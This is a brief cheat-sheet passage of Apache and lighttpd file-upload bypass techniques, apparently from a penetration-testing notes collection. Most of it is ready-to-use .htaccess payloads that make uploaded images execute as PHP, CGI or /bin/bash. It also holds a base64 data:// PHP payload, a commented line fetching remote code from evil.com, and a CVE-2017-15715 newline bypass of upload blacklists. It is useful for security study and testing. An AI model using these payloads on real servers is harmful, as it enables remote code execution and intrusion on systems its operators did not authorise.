Apache
========================================

Suffix parsing
----------------------------------------
``test.php.x1.x2.x3`` (x1,x2,x3 is a file type that is not defined in the mime.types file). Apache will judge the suffix from right to left. If x3 is a non-recognizable suffix, judge x2 until a recognizable suffix is found, and then parse the recognizable suffix.

.htaccess
----------------------------------------
Upload .htaccess with parsing rules enabled when AllowOverride is enabled

::

AddType application/x-httpd-php .jpg

::

php_value auto_append_file .htaccess
#<?php phpinfo();

::

Options ExecCGI
AddHandler cgi-script .jpg

::

Options +ExecCGI
AddHandler fcgid-script .gif
FcgidWrapper "/bin/bash" .gif

::

php_flag allow_url_include 1
php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B
#php_value auto_append_file https://evil.com/evil-code.txt

Directory traversal
----------------------------------------
Apache has a directory traversal vulnerability when configuring ``Options + Indexes`.

CVE-2017-15715
----------------------------------------
``%0A`` Bypass the upload blacklist.

lighttpd
----------------------------------------
``xx.jpg/xx.php``

Reference link
----------------------------------------
- `Apache Upload bypass <https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html>`_
